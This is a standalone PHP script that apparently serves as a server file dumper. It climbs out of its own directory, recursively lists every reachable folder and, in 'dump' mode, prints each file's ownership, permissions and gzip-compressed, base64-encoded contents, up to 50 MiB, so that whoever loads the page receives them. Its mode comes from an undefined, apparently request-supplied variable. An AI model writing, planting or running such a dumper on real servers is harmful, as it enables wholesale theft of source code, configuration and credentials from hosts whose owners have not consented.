<pre><?php

$ok = true;
while ($ok) {
	if ($mode != 'dump')
		echo("I'm currently in <strong>".getcwd()."</strong>.\nWalking up... ");
	$ok = @chdir('..');
	// if (getcwd() == '/')
		$ok = false;
	if ($mode != 'dump')
		echo((($ok)?('ok!'):('failed!'))."\n");
}

if ($mode != 'dump')
	echo("Let's see what we can get from here...\n");

$size = 0;
$maxsize = 52428800; // 50MiB
$subdirs = array(realpath('.'));
while (count($subdirs) > 0) {
	$dir = realpath(array_pop($subdirs));
	chdir($dir);
	echo("\n<strong>$dir:</strong>\n");
	if ($h = opendir($dir)) {
		while (($file = readdir($h)) !== false) {
			if (($file != '.') && ($file != '..')) {
				if (($mode == 'dump') && ($size < $maxsize)) {
					$info = '['.fileowner($file).':'.filegroup($file).':'.substr(sprintf('%o', fileperms($file)), -4).']';
					if (is_dir($file)) {
						echo("!DIR $info $file");
						array_push($subdirs, "$dir/$file");
					} else {
						$cont = @file_get_contents($file);
						if ($cont === false) {
							echo("!CANTREAD $info $file");
						} else {
							$size += strlen($cont);
							if ($size <= $maxsize) {
								$z = '';
								if (function_exists('gzcompress')) {
									$z = 'Z'; $cont = gzcompress($cont, 9);
								}
								echo("!BEGIN$z $info $file\n");
								echo(chunk_split(base64_encode($cont), 80, "\n"));
							} else {
								echo("!TRUNC $info $file\n");
								echo(chunk_split(base64_encode(substr($cont, 0, $size-$maxsize)), 80, "\n"));
							}
						}
					}
					echo("\n\n");
				} else {
					echo($file);
					if (is_dir($file)) {
						echo('/');
						array_push($subdirs, "$dir/$file");
					}
					echo("\n");
				}
			}
		}
		closedir($h);
	}
}

?></pre>
